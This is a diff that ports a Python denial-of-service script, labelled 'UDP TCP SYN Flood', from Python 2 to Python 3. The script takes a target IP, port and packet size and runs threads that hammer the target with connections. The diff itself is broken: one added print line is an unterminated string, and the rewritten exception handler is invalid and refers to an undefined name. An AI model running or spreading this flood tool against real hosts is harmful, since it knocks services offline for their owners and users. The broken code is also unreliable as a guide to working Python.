@@ -8,7 +8,7 @@ import random
 import socket
 
 if len(sys.argv) < 4:
-    print "ddos4"
+    print("UDP TCP SYN Flood")
     sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
 
 ip = sys.argv[1]
@@ -27,6 +27,7 @@ class syn(threading.Thread):
         for i in range(self.packets):
             try:
                 self.syn.connect((self.ip, self.port))
+                print(f"\033[
             except:
                 pass
 
@@ -77,8 +78,8 @@ while True:
         t.start()
         s.start()
     except KeyboardInterrupt:
-        print "Stopping Flood!"
+        print("Stopping Flood!")
         sys.exit()
-    except socket.error, msg:
-        print "Socket Couldn't Connect"
+    except (socket.error, msg):
+        print("Socket Couldn't Connect")
         sys.exit()
